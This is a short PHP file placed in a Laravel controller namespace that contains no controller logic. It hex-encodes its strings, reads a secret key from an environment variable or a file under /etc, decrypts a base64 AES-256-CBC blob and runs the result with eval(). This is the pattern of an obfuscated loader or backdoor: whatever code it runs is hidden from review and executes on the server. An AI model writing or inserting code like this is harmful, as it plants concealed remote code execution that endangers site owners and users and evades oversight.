<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Wb6SyYRJ8+l+bdJ+PX/BiA==');

$c=base64_decode(

'zcwLLdkaFWChLRvA96TKVxDNh7jk1Y8XTGGbE+Ev5c7ALXunL1f8FGKIHQELpeehpf77iztZqPz4' .
'viZAlli70DIi+zeoWuNyEkkxD2H5qXup7OZWspUsc77mkJ2ocEwPY0I+UkNY1JO80/LtdPjQMZvF' .
'9k3z5+ptpaeLSiHnlMLo0xs+sYybxhlGn3qPZt88AqDRVDkH5vcU8Or0qH3zMGd1wr6zrN78in+T' .
'/h6HbiQQ4ToF9T3dvTlIRl8NL02T'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

